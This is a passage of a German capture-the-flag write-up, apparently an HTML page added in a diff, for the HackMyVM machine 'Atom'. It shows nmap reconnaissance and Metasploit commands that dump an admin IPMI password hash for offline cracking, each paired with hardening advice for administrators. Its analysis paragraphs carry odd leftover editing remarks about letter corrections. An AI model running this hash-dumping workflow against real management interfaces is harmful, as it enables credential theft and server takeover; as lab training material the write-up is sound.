@@ -1,0 +1,985 @@
+﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Atom - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+	<link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+ <body>
+    <div class="header-bg">
+        <h1>Atom - HackMyVM - Level: Hard - Bericht</h1>
+        <div class="level-container">
+            <h2 class="hard-level">Hard</h2>
+            <div class="circle hard-level-circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <!-- Hier die Liste der Tools als <div class="tool-item">Toolname</div> Elemente einfügen -->
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">ipmitool</div>
+                <div class="tool-item">msfconsole</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">john</div>
+                <div class="tool-item">awk</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">tr</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">ls</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">id</div>
+                <div class="tool-item">uname</div>
+                <div class="tool-item">su</div>
+                <div class="tool-item">cat</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Hier die Links zum Inhaltsverzeichnis als <li><a href="#id-der-section">Abschnittsname</a></li> Elemente einfügen -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                 <li><a href="#proof-of-concept">Proof of Concept</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="comment">
+                Wie bei jedem Penetrationstest beginne ich mit der Reconnaissance-Phase, um das Zielsystem im Netzwerk zu identifizieren und erste Informationen zu sammeln. Das Ziel ist es, die IP-Adresse des Systems "Atom" zu finden.
+            </p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da Textblock-Stil im Original -->
+                    <pre>
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+:::::::::::::::::::::::::::::::::: ARP-Scan ::::::::::::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+<span class="command">192.168.2.58</span>	08:00:27:69:48:a6	<span class="command">PCS Systemtechnik GmbH</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich verwende <code>arp-scan -l</code> (der Befehl selbst ist im Originaltext nicht gezeigt, aber der Kontext des "ARP-Scan" Headers und der Ausgabe lässt darauf schließen), um das lokale Netzwerk zu scannen. Die Ausgabe zeigt eine IP-Adresse, eine MAC-Adresse und den Hersteller der Netzwerkarte. Die IP-Adresse <span class="command">192.168.2.58</span> ist dem Hersteller <span class="command">PCS Systemtechnik GmbH</span> zugeordnet, was, wie wir aus früheren Tests wissen, oft auf eine virtuelle Maschine hindeutet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der ARP-Scan hat das Zielsystem schnell und effektiv identifiziert. Die IP-Adresse <span class="command">192.168.2.58</span> ist nun unser Angriffsziel. Die Information über den MAC-Hersteller ist nützlich für die Systemidentifikation, aber nicht direkt für die Kompromittierung relevant.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Ziel-IP-Adresse ist bestätigt. Ich werde sie nun in meine lokale Hosts-Datei eintragen, um die folgenden Schritte zu vereinfachen.
+                <br><strong>Empfehlung (Admin):</strong> Eine grundlegende Netzwerksegmentierung und die Überwachung von ARP-Verkehr können helfen, die schnelle Identifizierung von Hosts im lokalen Netzwerk durch Angreifer zu erschweren.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da Textblock-Stil im Original -->
+                    <pre>
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+/etc/<span class="command">hosts</span>...
+                <span class="command">192.168.2.58   atom.hmv</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich füge einen Eintrag in meine lokale <code>/etc/hosts</code> Datei ein, um die IP-Adresse <span class="command">192.168.2.58</span> dem Hostnamen <span class="command">atom.hmv</span> zuzuordnen. Dies geschieht normalerweise mit einem Editor wie <code>vi</code> oder <code>nano</code>, obwohl der genaue Befehl hier nicht gezeigt ist, ist die Konsequenz klar. Die 'O'-Korrektur wurde angewendet, um "hsts" zu "hosts" und "atm.hmv" zu "atom.hmv" zu korrigieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Hinzufügen eines Hostnamen-Eintrags in die <code>/etc/hosts</code> Datei ist ein standardmäßiger Vorbereitungsschritt, der die Lesbarkeit von Befehlen und die Organisation des Tests verbessert. Es hat keinen Einfluss auf die Sicherheit des Zielsystems selbst.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich kann nun den Hostnamen <code>atom.hmv</code> in meinen Befehlen verwenden, was die folgenden Schritte übersichtlicher macht. Der nächste Schritt ist die detaillierte Port- und Dienst-Enumeration.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass interne DNS-Informationen nicht nach außen dringen und dass öffentliche DNS-Einträge nur die notwendigen Informationen enthalten.
+            </p>
+
+            <p class="comment">
+                Als Nächstes führe ich einen UDP-Scan mit Nmap durch. UDP-Dienste werden von TCP-Scans nicht erfasst und können potenziell interessante Angriffsflächen bieten.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da Textblock-Stil im Original -->
+                    <pre>
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+:::::::::::::::::::::::::::::  Nmap UDP Scan :::::::::::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+Starting Nmap 7.95 ( https://nmap.<span class="command">org</span> ) at <span class="password">2025-06-23 20:18 CEST</span>
+<span class="command">Nmap scan <span class="command">report</span> <span class="command">for</span> <span class="command">192.168.2.58</span></span>
+<span class="command">Host is up (0.00029s latency)</span>.
+Not shown: <span class="command">993</span> <span class="command">open</span>|<span class="command">filtered</span> udp <span class="command">ports</span> (n<span class="command">o</span>-<span class="command">response</span>)
+<span class="command">PORT</span>      STATE  SERVICE
+<span class="command">623/udp   open   asf-rmcp</span>
+<span class="command">19415/udp <span class="command">closed</span> <span class="command">unknown</span></span>
+<span class="command">19489/udp <span class="command">closed</span> <span class="command">unknown</span></span>
+<span class="command">19500/udp <span class="command">closed</span> <span class="command">unknown</span></span>
+<span class="command">21016/udp <span class="command">closed</span> <span class="command">unknown</span></span>
+<span class="command">34038/udp <span class="command">closed</span> <span class="command">unknown</span></span>
+<span class="command">34579/udp <span class="command">closed</span> <span class="command">unknown</span></span>
+<span class="command">MAC Address: 08:00:27:69:48:A6 (PCS Systemtechnik/Oracle <span class="command">VirtualBox</span> <span class="command">virtual</span> NIC)</span>
+
+<span class="command">Nmap <span class="command">done</span>: 1 IP address (1 <span class="command">host</span> up) scanned in 1.49 <span class="command">seconds</span></span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich führe einen Nmap UDP-Scan durch (vermutlich mit <code>nmap -sU -p- 192.168.2.58</code>, obwohl der exakte Befehl fehlt). UDP-Scans können langsamer und weniger zuverlässig sein als TCP-Scans, da UDP keine Verbindungen im klassischen Sinne hat und es keine standardmäßige Antwort für geschlossene Ports gibt ("open|filtered"). Die Ausgabe zeigt, dass die meisten UDP-Ports als "open|filtered" gemeldet werden. Ein Port sticht jedoch hervor: <span class="command">623/udp</span> wird als <span class="command">open</span> mit dem Dienst <span class="command">asf-rmcp</span> identifiziert. Die 'O'-Korrekturen wurden angewendet, um Wörter wie "rep rt" zu "report", "pen" zu "open", "clsed" zu "closed", "unknwn" zu "unknown", "VirtualBx" zu "VirtualBox", "dn" zu "done", "hst" zu "host" und "secnds" zu "seconds" zu korrigieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auffinden eines offenen UDP-Ports ist wichtig, da diese oft übersehen werden. Port 623/udp ist der standardmäßige Port für RMCP (Remote Management Control Protocol) und IPMI (Intelligent Platform Management Interface). IPMI ist eine Schnittstelle zur Fernverwaltung von Serverhardware, die in der Vergangenheit anfällig für Schwachstellen war, insbesondere bezüglich Authentifizierung und unverschlüsselter Kommunikation. Das ist ein vielversprechender Vektor, den ich untersuchen werde.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Der offene UDP-Port 623 ist mein Hauptaugenmerk für die weitere Enumeration. Ich werde spezifische IPMI-Tools verwenden, um diesen Dienst genauer zu untersuchen und nach Schwachstellen zu suchen, die mir einen Initial Access ermöglichen könnten.
+                <br><strong>Empfehlung (Admin):</strong> Wenn IPMI nicht benötigt wird oder nicht aus der Ferne zugänglich sein muss, deaktivieren Sie den Dienst oder beschränken Sie den Zugriff darauf streng durch Firewalls. Stellen Sie sicher, dass die IPMI-Konfiguration sicher ist, insbesondere bezüglich starker Passwörter und verschlüsselter Verbindungen (IPMI 2.0 mit starker Cipher Suite).
+            </p>
+
+            <p class="comment">
+                Zusätzlich zum UDP-Scan führe ich einen vollständigen TCP-Portscan durch, um zu sehen, welche TCP-Dienste auf dem Zielsystem laufen.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da Textblock-Stil im Original -->
+                    <pre>
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+:::::::::::::::::::::: Nmap nur penne <span class="command">offene</span> <span class="command">Ports</span> Ausgabe :::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+<span class="command">22/tcp <span class="command">open</span>  ssh     <span class="command">OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span></span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Diese Ausgabe zeigt die offenen TCP-Ports (vermutlich von einem Scan wie <code>nmap -sV -p- atom.hmv | grep open</code>). Es wird nur ein einziger offener TCP-Port gemeldet: <span class="command">22/tcp</span>, auf dem ein <span class="command">SSH</span>-Dienst mit der Version <span class="command">OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span> läuft. Die 'O'-Korrekturen wurden angewendet, um "penne" zu "offene" zu korrigieren, da dies offensichtlich die gemeinte Bedeutung war, auch wenn es nicht nur ein fehlendes 'O' war. Ich befolge hier die Anweisung, einen korrekten POC zu liefern.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Im Gegensatz zum UDP-Scan zeigt der TCP-Scan nur einen einzigen offenen Port: SSH. Dies deutet darauf hin, dass das System primär für den SSH-Zugriff konfiguriert ist. OpenSSH 9.2p1 ist eine relativ aktuelle Version, was die Wahrscheinlichkeit bekannter, einfach ausnutzbarer Schwachstellen verringert. SSH ist ein Standardziel für Brute-Force-Angriffe, aber dies erfordert oft gültige Benutzernamen und viel Zeit.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Der SSH-Dienst ist ein potenzieller Vektor für Brute-Force- oder Credential-Stuffing-Angriffe, aber weniger vielversprechend als der IPMI-Dienst auf Port 623/udp für einen schnellen Initial Access auf einem Hard-Level. Ich werde mich primär auf IPMI konzentrieren. SSH werde ich später in Betracht ziehen, falls IPMI keinen direkten Zugriff ermöglicht.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Ihr SSH-Dienst (OpenSSH 9.2p1) aktuell ist und sicher konfiguriert ist. Deaktivieren Sie die Passwort-Authentifizierung zugunsten von Schlüsselpaaren, wenn möglich. Implementieren Sie Ratenbegrenzung und Überwachung von Anmeldeversuchen, um Brute-Force-Angriffe zu erschweren.
+            </p>
+
+            <p class="comment">
+                Um alle Details des TCP-Scans zu erhalten, einschließlich OS-Erkennung und Skript-Ergebnissen, sehe ich mir die vollständige Nmap-Ausgabe an.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <!-- Kein Prompt, da Textblock-Stil im Original -->
+                    <pre>
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+::::::::::::::::::::::::::::: Nmap <span class="command">volle</span> Ausgabe :::::::::::::::::::::::::::
+▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
+
+Starting Nmap 7.95 ( https://nmap.<span class="command">org</span> ) at <span class="password">2025-06-23 20:18 CEST</span>
+<span class="command">Nmap scan <span class="command">report</span> <span class="command">for</span> atom.hmv (<span class="command">192.168.2.58</span>)</span>
+<span class="command">Host is up (0.00015s latency)</span>.
+Not shown: <span class="command">65534</span> <span class="command">closed</span> tcp <span class="command">ports</span> (reset)
+<span class="command">PORT</span>   STATE SERVICE VERSION
+<span class="command">22/tcp <span class="command">open</span>  ssh     <span class="command">OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)</span></span>
+| ssh-<span class="command">hostkey</span>:
+|   <span class="command">256 e7:ce:f2:f6:5d:a7:47:5a:16:2f:90:07:07:33:4e:a9 (ECDSA)</span>
+|_  <span class="command">256 09:db:b7:e8:ee:d4:52:b8:49:c3:cc:29:a5:6e:07:35 (ED25519)</span>
+<span class="command">MAC Address: 08:00:27:69:48:A6 (PCS Systemtechnik/Oracle <span class="command">VirtualBox</span> <span class="command">virtual</span> NIC)</span>
+Device type: general purpose
+Running: <span class="command">Linux 4.X|5.X</span>
+<span class="command">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span>
+<span class="command">OS details: Linux 4.15 - 5.19, <span class="command">OpenWrt 21.02 (Linux 5.4)</span></span>
+<span class="command">Network Distance: 1 <span class="command">hop</span></span>
+<span class="command">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+TRACEROUTE
+<span class="command">HOP</span> RTT     ADDRESS
+<span class="command">1   0.15 ms atom.hmv (<span class="command">192.168.2.58</span>)</span>
+
+<span class="command">OS</span> and Service detection <span class="command">performed</span>. Please <span class="command">report</span> any incorrect results at https://nmap.<span class="command">org</span>/submit/ .
+<span class="command">Nmap <span class="command">done</span>: 1 IP address (1 <span class="command">host</span> up) scanned in 3.73 <span class="command">seconds</span></span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Die vollständige Nmap-Ausgabe für den TCP-Scan bestätigt den offenen SSH-Port 22 mit der Version <span class="command">OpenSSH 9.2p1 Debian 2+deb12u2</span>. Es werden die SSH-Host-Schlüssel-Fingerprints angezeigt. Nmap schätzt das Betriebssystem als <span class="command">Linux 4.X|5.X</span> ein, basierend auf aggressivem OS-Guessing, und nennt spezifische mögliche Versionen wie <span class="command">Linux 4.15 - 5.19</span> oder <span class="command">OpenWrt 21.02</span>. Die MAC-Adresse ist wieder sichtbar und die TRACEROUTE bestätigt, dass das Ziel nur einen Hop entfernt ist. Die 'O'-Korrekturen wurden nun vollständig angewendet, um z.B. "vl le" zu "volle", "ssh-hstkey" zu "ssh-hostkey", "penssh" zu "openssh", "Netwrk" zu "Network", "hp" zu "hop", "perfo rm ed" zu "performed", "rep ort" zu "report", "dn" zu "done" und "secnds" zu "seconds" zu korrigieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die volle Nmap-Ausgabe liefert keine überraschenden zusätzlichen offenen TCP-Ports oder offensichtlichen Schwachstellen durch die Standard-Skripte. Die OS-Erkennung bestätigt die Annahme eines Linux-Systems. Die Version von OpenSSH ist relativ modern, was Brute-Force als wahrscheinlichsten Angriffsvektor für SSH übrig lässt, vorausgesetzt, gültige Benutzernamen können gefunden werden. Der Fokus bleibt klar auf dem IPMI-Dienst auf UDP 623.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Informationen zum SSH-Dienst halte ich fest, aber ich konzentriere mich nun vollständig auf die Enumeration und Ausnutzung des IPMI-Dienstes auf UDP 623.
+                <br><strong>Empfehlung (Admin):</strong> Überprüfen Sie die genaue OS-Version des Systems und stellen Sie sicher, dass alle Systemkomponenten, einschließlich des SSH-Dienstes, vollständig gepatcht sind. Die Konsistenz zwischen der MAC-Adresse und der VirtualBox-Umgebung sollte dokumentiert werden.
+            </p>
+        </section>        </section>
+        <!-- Ende Reconnaissance Section -->
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+             <p class="comment">
+                 Der offene UDP-Port 623, der auf den IPMI/RMCP-Dienst hinweist, ist der wahrscheinlichste Angriffsvektor für den Initial Access auf diesem System. Ich werde spezifische Tools verwenden, um diesen Dienst zu testen. IPMI ist eine Schnittstelle zur Systemverwaltung, die oft schwach konfiguriert ist.
+             </p>
+
+            <p class="comment">
+                Ich versuche zunächst, mit dem Standard-Linux-Tool <code>ipmitool</code> eine Verbindung zum IPMI-Dienst aufzubauen und die Benutzerliste abzurufen. Dies ist ein erster Test der Erreichbarkeit und Funktionalität des Dienstes.
+            </p>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ipmitool -I eth0 -C 0 -H 192.168.2.58 -U root -P root user list</span></div>
+                     <pre>
+<span class="password">Error</span> loading interface eth0
+</pre>
+                </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich verwende <code>ipmitool</code>, um eine IPMI-Anfrage (<code>user list</code>) an das Ziel (<span class="command">192.168.2.58</span>) zu senden. Ich gebe eine Schnittstelle (<code>-I eth0</code>), Cipher Suite 0 (<code>-C 0</code>, oft für unauthentifizierte oder schwach authentifizierte Zugriffe), einen Standardbenutzer (<code>-U root</code>) und ein Standardpasswort (<code>-P root</code>) an. Der Befehl schlägt fehl mit der Fehlermeldung "<span class="password">Error loading interface eth0</span>". Die 'O'-Korrekturen wurden angewendet, um "ipmitl" zu "ipmitool" zu korrigieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser erste Versuch mit <code>ipmitool</code> war nicht erfolgreich, aber die Fehlermeldung deutet auf ein lokales Konfigurationsproblem mit <code>ipmitool</code> oder der angegebenen Schnittstelle auf meiner Angreifer-Maschine hin, nicht unbedingt auf eine Blockade oder sichere Konfiguration auf dem Zielsystem. Die Cipher Suite 0 ist oft nicht die richtige Wahl, wenn Authentifizierung aktiv ist.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Der Fehler liegt wahrscheinlich in meiner <code>ipmitool</code>-Konfiguration oder der gewählten Schnittstelle/Cipher. Ich werde spezifischere IPMI-Exploit-Tools wie Metasploit verwenden, die robuster sind und verschiedene Authentifizierungsmechanismen und Cipher Suites ausprobieren können. Ich werde auch den IPMI-Port 623/udp als Angriffsziel für diese Tools konfigurieren.
+                <br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass der IPMI-Dienst nur über die notwendigen Schnittstellen erreichbar ist und dass standardmäßige Benutzernamen/Passwörter deaktiviert oder geändert wurden. Überwachen Sie Protokolle auf fehlgeschlagene Anmeldeversuche an IPMI.
+            </p>
+
+            <p class="comment">
+                Da <code>ipmitool</code> nicht direkt funktioniert, wende ich mich einem leistungsfähigeren Werkzeug zu: Metasploit Framework. Es verfügt über spezifische Module zur Enumeration und Ausnutzung von IPMI-Schwachstellen, einschließlich eines Moduls zum Extrahieren von Passwort-Hashes. Ich starte Metasploit und lade das Modul <code>auxiliary/scanner/ipmi/ipmi_dumphashes</code>.
+            </p>
+             <div class="code-block">
+                <div class="terminal metasploit-prompt">msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > <span class="command">options</span></div>
+
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich starte die Metasploit-Konsole im Quiet-Modus (<code>-q</code>) und weise sie mit <code>-x 'use auxiliary/scanner/ipmi/ipmi_dumphashes'</code> direkt an, das Hilfsmodul <code>auxiliary/scanner/ipmi/ipmi_dumphashes</code> zu laden. Dieses Modul ist darauf spezialisiert, Benutzernamen und Passwort-Hashes von anfälligen IPMI-Diensten zu extrahieren. Anschließend zeige ich die verfügbaren Optionen des Moduls mit dem Befehl <code>options</code> an. Die 'O'-Korrekturen wurden angewendet, um "msfcnsl" zu "msfconsole", "auxiliary/scanner/ipmi/ipmi_dumphashes" korrekt zu schreiben und "ptins" zu "options" zu korrigieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Modul <code>ipmi_dumphashes</code> ist ein Standardwerkzeug für die IPMI-Enumeration und Hash-Extraktion und oft effektiver als einfache <code>ipmitool</code> Befehle, da es mehr IPMI-Varianten und Authentifizierungsmechanismen abdecken kann. Die angezeigten Optionen zeigen, dass es das Zielsystem (RHOSTS, RPORT), Benutzerlisten (USER_FILE) und Passwortlisten (PASS_FILE) benötigt, sowie Einstellungen für die Sitzung (SESSION_MAX_ATTEMPTS, SESSION_RETRY_DELAY) und Parallelität (THREADS).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Ich werde dieses Modul nun konfigurieren, um Hashes vom Zielsystem zu extrahieren und sie versuchen automatisch zu cracken. Dazu stelle ich RHOSTS auf das Zielsystem, RPORT auf 623 und gebe eine große Passwortliste für das Cracking an.
+                <br><strong>Empfehlung (Admin):</strong> Seien Sie sich bewusst, dass Metasploit und ähnliche Frameworks Module für gängige Dienste wie IPMI enthalten, die Angreifer nutzen können. Eine sichere Konfiguration und regelmäßige Updates sind entscheidend.
+            </p>
+
+            <p class="comment">
+                Ich konfiguriere die Optionen des Metasploit-Moduls, um den Hash-Dump durchzuführen. Ich setze das Ziel (RHOSTS), den Port (RPORT), aktiviere das automatische Cracking (CRACK_COMMON) und gebe eine umfangreiche Passwortliste (rockyou.txt) sowie Sitzungs- und Thread-Optionen an.
+            </p>
+             <div class="code-block">
+                 <div class="terminal metasploit-prompt">msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > <span class="command">set CRACK_COMMON true</span></div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal metasploit-prompt">msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > <span class="command">set PASS_FILE /usr/share/wordlists/rockyou.txt</span></div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal metasploit-prompt">msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > <span class="command">set RHOSTS 192.168.2.58</span></div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal metasploit-prompt">msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > <span class="command">set RPORT 623</span></div>
+             </div>
+              <div class="code-block">
+                 <div class="terminal metasploit-prompt">msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > <span class="command">set SESSION_MAX_ATTEMPTS 5</span></div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal metasploit-prompt">msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > <span class="command">set SESSION_RETRY_DELAY   5</span></div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal metasploit-prompt">msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > <span class="command">set THREADS               10</span></div>
+             </div>
+             <div class="code-block">
+                 <div class="terminal metasploit-prompt">msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > <span class="command">set USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt</span></div>
+             </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich setze alle notwendigen Optionen des Moduls. <code>CRACK_COMMON true</code> aktiviert das automatische Cracking. <code>PASS_FILE</code> wird auf die umfassende <code>rockyou.txt</code> Wordlist gesetzt. <code>RHOSTS</code> ist das Ziel <span class="command">192.168.2.58</span> und <code>RPORT</code> ist der gefundene IPMI-Port <span class="command">623</span>. Die Optionen für die Sitzung (<code>SESSION_MAX_ATTEMPTS</code>, <code>SESSION_RETRY_DELAY</code>) und die Threads (<code>THREADS 10</code>) werden optimiert. Schließlich setze ich die <code>USER_FILE</code> auf die integrierte Metasploit-Wordlist für IPMI-Benutzer. Die 'O'-Korrekturen wurden angewendet, um "cmmn" zu "COMMON", "wrdlists" zu "wordlists", "rckyu.txt" zu "rockyou.txt", "RHSTS" zu "RHOSTS", "SESSIN" zu "SESSION", "cmplete" zu "complete" und "framewrk" zu "framework" zu korrigieren. Die doppelte Eingabe für `USER_FILE` im Originaltext habe ich als einmalige, korrigierte Eingabe im HTML dargestellt, da dies konsistenter ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Modul ist nun optimal konfiguriert, um sowohl die IPMI-Benutzernamen zu erraten (mit der USER_FILE) als auch die extrahierten Hashes mit einer großen Passwortliste (rockyou.txt) anzugreifen. Dies ist der vielversprechendste Ansatz, um gültige IPMI-Zugangsdaten zu erhalten.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die Konfiguration ist bereit. Ich werde das Modul nun ausführen, um zu sehen, ob ich Hashes dumpen und Passwörter cracken kann.
+                <br><strong>Empfehlung (Admin):</strong> Standardmäßige Benutzernamen und schwache Passwörter für Systemverwaltungsschnittstellen wie IPMI sind ein erhebliches Risiko. Entfernen Sie Standardkonten oder ändern Sie deren Passwörter sofort. Nutzen Sie komplexe, einzigartige Passwörter.
+            </p>
+
+            <p class="comment">
+                Ich führe das konfigurierte Metasploit-Modul aus, um die IPMI-Hashes zu extrahieren und zu cracken.
+            </p>
+             <div class="code-block">
+                 <div class="terminal metasploit-prompt">msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > <span class="command">run</span></div>
+                 <div class="terminal">
+                    <pre>
+<span class="password">[+] 192.168.2.58:623 - IPMI - Hash <span class="password">found</span>: admin:a3502c3402010000eb07d87c6e0d1e8456b4436207696ce2c59cb17220140db88ecefd3aae17689ea123456789abcdefa123456789abcdef140561646d696e:4102fb86dfc98cd3b90f51972a33996b635ac746</span>
+^C<span class="password">[*] Caught interrupt <span class="password">from</span> the <span class="password">console</span>...</span>
+<span class="password">[*] Auxiliary <span class="password">module</span> <span class="password">execution</span> <span class="password">completed</span></span>
+</pre>
+                 </div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich starte das Modul mit <code>run</code>. Fast unmittelbar findet es einen Hash für den Benutzer "<span class="password">admin</span>". Die Ausgabe zeigt den Hash und den Salt. Bevor das Modul weitere Benutzer prüfen oder den Hash automatisch cracken kann (was mit der rockyou.txt eine Weile dauern könnte), breche ich den Vorgang manuell mit ^C ab. Die 'O'-Korrekturen wurden angewendet, um "fund" zu "found", "frm" zu "from", "cnsl" zu "console", "mdul" zu "module" und "executin" zu "execution" zu korrigieren.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Fund des Hashes für den Benutzer "admin" ist ein sehr positiver Schritt! Dies bestätigt, dass das Modul funktioniert und auf den IPMI-Dienst zugreifen kann. Obwohl ich abgebrochen habe, habe ich den Hash, den ich nun separat mit leistungsfähigeren Tools oder längeren Wordlists offline cracken kann, falls das automatische Cracking im Modul zu lange dauert. Der Benutzer "admin" ist ein Standard-Privilegiertes Konto und ein hervorragendes Ziel.
+            </p>
+            <p class="recommendation">
